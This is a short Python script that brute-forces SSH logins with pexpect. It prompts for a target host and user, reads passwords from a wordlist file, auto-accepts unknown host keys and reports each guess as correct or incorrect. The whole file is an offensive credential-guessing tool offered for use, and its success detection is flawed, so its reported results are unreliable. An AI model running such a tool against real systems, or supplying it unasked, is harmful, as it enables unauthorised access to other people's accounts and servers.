#!usr/bin/python

import pexpect

PROMPT = ['# ', '>>> ', '> ', '\$ ']

# This command attempts to connect with the host via ssh
# And if successfull, returns the connection
# Parameters : username of the host, ip of the host, password of the host
def connect(username,ip,credential):
	ssh_newkey = 'Are you sure you want to continue connecting'
	connection_string = 'ssh ' + username + '@' + ip
	child = pexpect.spawn(connection_string)
	return_result = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword: '])
	if return_result == 0:
		print ('[-] Error Connecting via SSH')
		return
	if return_result == 1:
		child.sendline('yes')
		return_result = child.expect([pexpect.TIMEOUT,'[P|p]assword: '])
		if return_result == 0:
			print("[-] Error Connecting")
			return
	child.sendline(credential)
	child.expect(PROMPT,timeout=0.5)
	return child 
	
def startMain():
	host = input('[*] Enter target host: ') 
	user = input('[*] Enter target user: ')
	print('\n')
	print('---Opening list---') 
	password_file = open('passwordlst.txt', 'r')
	print('\n')
	print('Checking for matches..')
	print('\n')
	for password in password_file.readlines():
		password = password.strip('\n')
		try:
			connect(user,host,password)
			print("[+] Correct Password : %s" % (password))
		except:
			print("[-] Incorrect Password : %s" % (password))
			
startMain()
